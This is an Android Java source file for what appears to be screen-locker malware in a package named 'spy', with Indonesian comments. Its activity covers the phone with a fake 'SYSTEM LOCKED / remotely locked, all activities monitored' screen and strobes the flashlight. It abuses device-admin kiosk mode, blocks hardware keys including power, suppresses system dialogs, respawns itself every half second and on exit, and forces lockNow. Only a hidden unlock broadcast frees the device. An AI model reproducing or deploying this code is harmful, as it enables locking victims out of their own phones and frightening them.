package com.voyre.spy;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.Color;
import android.graphics.Typeface;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class LockScreenActivity extends Activity {

    private Handler timeHandler = new Handler();
    private Handler handler = new Handler();
    private Handler cameraHandler = new Handler();
    private PowerManager.WakeLock wakeLock;
    private BroadcastReceiver unlockReceiver;
    private TextView timeView;
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isTorchOn = false;
    private Runnable torchRunnable;
    private boolean isUnlocking = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);

        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH);
        
        // ===== TAMBAHAN 1: BIAR GA BISA DISWIPE =====
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
            setTurnScreenOn(true);
            getWindow().addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED);
        }

        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.FULL_WAKE_LOCK |
                PowerManager.ACQUIRE_CAUSES_WAKEUP |
                PowerManager.ON_AFTER_RELEASE, "LockScreen::WakeLock");
        wakeLock.acquire();

        setupLockScreen();
        setupUnlockReceiver();
        setupTorch();

        // --- HARD LOCK (KIOSK MODE) ---
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                // ===== TAMBAHAN 2: SET LOCK TASK PACKAGES BIAR LEBIH KUAT =====
                DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
                if (dpm.isAdminActive(adminComponent)) {
                    dpm.setLockTaskPackages(adminComponent, new String[]{getPackageName()});
                }
                startLockTask(); 
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        
        // ===== TAMBAHAN 3: MONITOR BIAR GA BISA KELUAR (TAPI UNLOCK TETAP JALAN) =====
        startMonitor();
        // --------------------------------------------
    }
    
    // ===== TAMBAHAN METHOD MONITOR =====
    private void startMonitor() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!isFinishing() && !isUnlocking) {
                    // Force balik ke lock screen
                    Intent intent = new Intent(LockScreenActivity.this, LockScreenActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    startActivity(intent);
                }
                handler.postDelayed(this, 500);
            }
        }, 500);
    }

    private void setupLockScreen() {
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#0A0A0A"));

        TextView titleText = new TextView(this);
        titleText.setText("⚠️ SYSTEM LOCKED ⚠️");
        titleText.setTextColor(Color.parseColor("#FF5555"));
        titleText.setTextSize(32);
        titleText.setGravity(Gravity.CENTER);
        titleText.setTypeface(Typeface.create("monospace", Typeface.BOLD));
        titleText.setPadding(20, 80, 20, 20);
        layout.addView(titleText);

        TextView byText = new TextView(this);
        byText.setText("by @kaell_Xz");
        byText.setTextColor(Color.parseColor("#4CAF50"));
        byText.setTextSize(20);
        byText.setGravity(Gravity.CENTER);
        byText.setTypeface(Typeface.create("monospace", Typeface.NORMAL));
        byText.setPadding(20, 0, 20, 50);
        layout.addView(byText);

        timeView = new TextView(this);
        timeView.setTextColor(Color.WHITE);
        timeView.setTextSize(42);
        timeView.setGravity(Gravity.CENTER);
        timeView.setTypeface(Typeface.create("monospace", Typeface.NORMAL));
        timeView.setPadding(20, 30, 20, 30);
        layout.addView(timeView);

        TextView warningText = new TextView(this);
        warningText.setText("Unauthorized Access Detected\n\nThis device has been remotely locked.\nAll activities are being monitored.\n\nDo not attempt to unlock or power off.");
        warningText.setTextColor(Color.parseColor("#FF8888"));
        warningText.setTextSize(16);
        warningText.setGravity(Gravity.CENTER);
        warningText.setTypeface(Typeface.create("monospace", Typeface.NORMAL));
        warningText.setPadding(40, 60, 40, 40);
        layout.addView(warningText);

        TextView matrixText = new TextView(this);
        matrixText.setText("01001000 01000001 01000011 01001011 01000101 01000100\n" +
                "00100000 01000010 01011001 00100000 01010000 01010010 01001001 01001101 01010010 01001111 01010011 01000101 01000101 01001100 01001100");
        matrixText.setTextColor(Color.parseColor("#1A4CAF50"));
        matrixText.setTextSize(14);
        matrixText.setGravity(Gravity.CENTER);
        matrixText.setTypeface(Typeface.create("monospace", Typeface.NORMAL));
        matrixText.setPadding(20, 60, 20, 40);
        layout.addView(matrixText);

        timeHandler.post(new Runnable() {
            @Override
            public void run() {
                SimpleDateFormat sdf = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
                timeView.setText(sdf.format(new Date()));
                timeHandler.postDelayed(this, 1000);
            }
        });

        setContentView(layout);
    }

    private void setupTorch() {
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            if (cameraManager != null) {
                cameraId = cameraManager.getCameraIdList()[0];
            }
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }

        torchRunnable = new Runnable() {
            @Override
            public void run() {
                try {
                    if (cameraManager != null && cameraId != null) {
                        isTorchOn = !isTorchOn;
                        cameraManager.setTorchMode(cameraId, isTorchOn);
                    }
                } catch (CameraAccessException e) {
                    e.printStackTrace();
                }
                cameraHandler.postDelayed(this, 500);
            }
        };
        cameraHandler.post(torchRunnable);
    }

    private void setupUnlockReceiver() {
        unlockReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if ("UNLOCK_ACTION".equals(intent.getAction())) {
                    isUnlocking = true;
                    
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        try {
                            stopLockTask(); 
                        } catch (Exception e) {}
                    }
                    
                    finish();
                }
            }
        };
        registerReceiver(unlockReceiver, new IntentFilter("UNLOCK_ACTION"));
    }

    @Override
    public void onBackPressed() {
        // MATI TOTAL
    }

    @Override
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        // ===== TAMBAHAN 4: BLOCK TOMBOL POWER JUGA =====
        if (keyCode == KeyEvent.KEYCODE_BACK ||
                keyCode == KeyEvent.KEYCODE_HOME ||
                keyCode == KeyEvent.KEYCODE_APP_SWITCH ||
                keyCode == KeyEvent.KEYCODE_MENU ||
                keyCode == KeyEvent.KEYCODE_VOLUME_UP ||
                keyCode == KeyEvent.KEYCODE_VOLUME_DOWN ||
                keyCode == KeyEvent.KEYCODE_POWER) {
            return true;
        }
        return super.onKeyDown(keyCode, event);
    }

    @Override
    public void onWindowFocusChanged(boolean hasFocus) {
        super.onWindowFocusChanged(hasFocus);
        if (!hasFocus && !isUnlocking) {
            // ===== TAMBAHAN 5: FORCE FOCUS BALIK =====
            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
            sendBroadcast(closeDialog);
            
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    getWindow().getDecorView().requestFocus();
                    getWindow().getDecorView().setSystemUiVisibility(
                            View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                            View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                            View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                            View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                            View.SYSTEM_UI_FLAG_FULLSCREEN |
                            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                    );
                }
            }, 50);
        }
    }

    @Override
    protected void onUserLeaveHint() {
        super.onUserLeaveHint();
        if (!isUnlocking) {
            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
            sendBroadcast(closeDialog);
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        if (!isUnlocking) {
            WindowManager.LayoutParams attrs = getWindow().getAttributes();
            attrs.flags |= WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
            getWindow().setAttributes(attrs);

            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
            sendBroadcast(closeDialog);

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (!isFinishing() && !isUnlocking) {
                        WindowManager.LayoutParams attrs = getWindow().getAttributes();
                        attrs.flags &= ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;
                        getWindow().setAttributes(attrs);

                        Intent intent = new Intent(LockScreenActivity.this, LockScreenActivity.class);
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                        startActivity(intent);
                    }
                }
            }, 100);
        }
    }

    @Override
    protected void onStop() {
        super.onStop();
        if (!isFinishing() && !isUnlocking) {
            Intent intent = new Intent(this, LockScreenActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
        }
    }

    @Override
    protected void onDestroy() {
        // ===== TAMBAHAN 6: KALAU BUKAN UNLOCK, RESPAWN =====
        if (!isUnlocking) {
            Intent intent = new Intent(this, LockScreenActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        }
        
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }

        timeHandler.removeCallbacksAndMessages(null);
        cameraHandler.removeCallbacks(torchRunnable);

        try {
            if (cameraManager != null && cameraId != null && isTorchOn) {
                cameraManager.setTorchMode(cameraId, false);
            }
        } catch (CameraAccessException e) {
            e.printStackTrace();
        }

        if (unlockReceiver != null) {
            unregisterReceiver(unlockReceiver);
        }

        if (!isUnlocking) {
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);

            if (devicePolicyManager.isAdminActive(adminComponent)) {
                devicePolicyManager.lockNow();
            }
        }

        super.onDestroy();
    }
}